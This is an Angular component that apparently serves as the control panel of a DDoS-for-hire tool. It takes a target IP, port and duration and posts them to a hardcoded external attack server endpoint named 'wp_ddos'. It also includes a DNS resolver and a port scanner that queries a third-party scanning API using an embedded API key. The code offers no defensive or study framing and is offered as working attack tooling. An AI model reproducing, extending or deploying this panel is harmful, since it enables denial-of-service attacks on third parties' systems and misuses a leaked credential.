import { Component, ViewChild, ElementRef} from '@angular/core';

import { NgbModal } from '@ng-bootstrap/ng-bootstrap';

import { ModalComponent } from './modal/modal.component';


import { HttpHeaders } from '@angular/common/http';
import { Headers, RequestOptions } from '@angular/http';
import { Request, RequestMethod} from '@angular/http';
import { HttpClient } from '@angular/common/http'

@Component({
  selector: 'ngx-Ddos',
  styleUrls: ['./ddos.component.scss'],
  templateUrl: './ddos.component.html',
})

export class DdosComponent {

    attack: any;
    attackStart: any;
    currentAttackTime: number;
    IpResolved: string;
    PortResolved: string;

    @ViewChild('ip')ip: ElementRef;
    @ViewChild('port')port: ElementRef;
    @ViewChild('time')time: ElementRef;
    @ViewChild('button')button: ElementRef;
    @ViewChild('dns')dns: ElementRef;
    @ViewChild('_sp_ip')_sp_ip: ElementRef;
    @ViewChild('sport')sport: ElementRef;
    @ViewChild('scanport')scanport: ElementRef;
    @ViewChild('currentAttack')currentAttack: ElementRef;
    @ViewChild('messageResolvedDns')messageResolvedDns: ElementRef;
    @ViewChild('messageScanPortOpen')messageScanPortOpen: ElementRef;
    @ViewChild('messageScanPortClose')messageScanPortClose: ElementRef;

    constructor(private modalService: NgbModal, private http: HttpClient) {
        this.currentAttackTime = 50;
    }

    updateCurrentAttackTime() {
        this.currentAttackTime--;
        console.log(this.currentAttackTime);
    }

    ngOnInit(){
        console.log(this.currentAttackTime);
        setInterval(this.updateCurrentAttackTime(), 1000);
        let attackDate = new Date(localStorage.getItem("attack_start"));
        let tmpDate = new Date(localStorage.getItem("attack_start"));;
        this.ip.nativeElement.value = "127.0.0.1";
        this.port.nativeElement.value = "80";
        this.time.nativeElement.value = "5";
        tmpDate.setSeconds(attackDate.getSeconds() + Number(localStorage.getItem('attack_time')));

        if (tmpDate.getTime() < new Date().getTime()) {
            console.log("attack start");
            this.showCurrentAttack();
        } else {
            console.log("attack dont start");
        }
    }

    showCurrentAttack() {
        this.currentAttack.nativeElement.style = "display:block;"
    }

    doAttack(attack:any) {
        const attackIP = this.ip.nativeElement.value;
        const attackPort = this.port.nativeElement.value;
        const attackTime = this.time.nativeElement.value;

        if (attackIP == "" || attackPort == "" || attackTime == "") {
            this.showMissingInformation(attackIP, attackPort, attackTime);
        } else {
            var url = "http://93.9.51.53:3000/api/wp_ddos";
            var headers = new HttpHeaders();
            var body =  JSON.stringify({ip: attackIP, port: attackPort, duration: attackTime});
            console.log(body);
            headers.append('Content-Type', 'raw');
            this.http
              .post(url,
              body, {
                headers: headers
              })
              .subscribe(data => {
                  console.log(data);
            });
        }

    }
    resolveDns() {
        let dns = this.dns.nativeElement.value;
        if (dns == "") {
            this.showResolveMissingInformation("Domain name");
        } else {
            console.log("resolve dns : ");
            console.log(dns);
            this.http.get('http://ip-api.com/json/' + dns).subscribe((res: any) => {
                this.IpResolved = res.query;
                this.messageResolvedDns.nativeElement.style = "display:block;";
            });
        }
    }

    scanPort() {
        let _port = this.sport.nativeElement.value;
        let _sp_ip = this._sp_ip.nativeElement.value;
        if (_port == "" && _sp_ip == "") {
            this.showResolveMissingInformation("Port and IP");
        } else if (_port == "") {
            this.showResolveMissingInformation("Port");
        } else if (_sp_ip == "") {
            this.showResolveMissingInformation("IP");
        } else {
            console.log("scan port : ");
            console.log(_port);
            console.log('http://api.c99.nl/portscanner.php?key=RBQD8-T5WEE-4KM7Q-WZ7I8&host=' + _sp_ip + '&port=' + _port);
            this.http.get('http://api.c99.nl/portscanner.php?key=RBQD8-T5WEE-4KM7Q-WZ7I8&host=' + _sp_ip + '&port=' + _port, {responseType: 'text'}).subscribe((res: any) => {
                console.log("res = " + res);
                if (res == _port) {
                    this.PortResolved = "open";
                    this.messageScanPortOpen.nativeElement.style = "display:block;";
                    this.messageScanPortClose.nativeElement.style = "display:none;";
                } else {
                    this.PortResolved = "close";
                    this.messageScanPortClose.nativeElement.style = "display:block;";
                    this.messageScanPortOpen.nativeElement.style = "display:none;";
                }

            });
        }
    }

    validateAttack(ip: string, port: string, time: string) {
        return (true);
    }

    // showLargeModal() {
    //   const activeModal = this.modalService.open(ModalComponent, { size: 'lg', container: 'nb-layout' });
    //
    //   activeModal.componentInstance.modalHeader = 'Large Modal';
    // }
    // showSmallModal() {
    //   const activeModal = this.modalService.open(ModalComponent, { size: 'sm', container: 'nb-layout' });
    //
    //   activeModal.componentInstance.modalHeader = 'Small Modal';
    // }

    showMissingInformation(ip: string, port: string, time: string) {

      const activeModal = this.modalService.open(ModalComponent, {
        size: 'lg',
        backdrop: 'static',

      });

      var first = 0;

      activeModal.componentInstance.modalHeader = 'Missing information';
      activeModal.componentInstance.modalContent = 'They information are missing :';
      activeModal.componentInstance.modalFooter = "OK";
      if (ip == "") {
          if (first === 1) {
              activeModal.componentInstance.modalContent += ',';
          } else {
              activeModal.componentInstance.modalContent += ' ';
          }
          activeModal.componentInstance.modalContent += ' IP';
          first = 1;
      }
      if (port == "") {
          if (first === 1) {
              activeModal.componentInstance.modalContent += ', ';
          } else {
              activeModal.componentInstance.modalContent += ' ';
          }
          activeModal.componentInstance.modalContent += 'Port';
          first = 1;
      }
      if (time == "") {
          if (first === 1) {
              activeModal.componentInstance.modalContent += ' and ';
          } else {
              activeModal.componentInstance.modalContent += ' ';
          }
          activeModal.componentInstance.modalContent += 'Time';
          first = 1;
      }
      activeModal.componentInstance.modalContent += '.';
    }

    showResolveMissingInformation(name: string) {

      const activeModal = this.modalService.open(ModalComponent, {
        size: 'lg',
        backdrop: 'static',

      });

      activeModal.componentInstance.modalHeader = 'Missing information';
      activeModal.componentInstance.modalContent = 'They information are missing : ';
      activeModal.componentInstance.modalContent += name;
      activeModal.componentInstance.modalFooter = "OK";
      activeModal.componentInstance.modalContent += '.';
    }
}
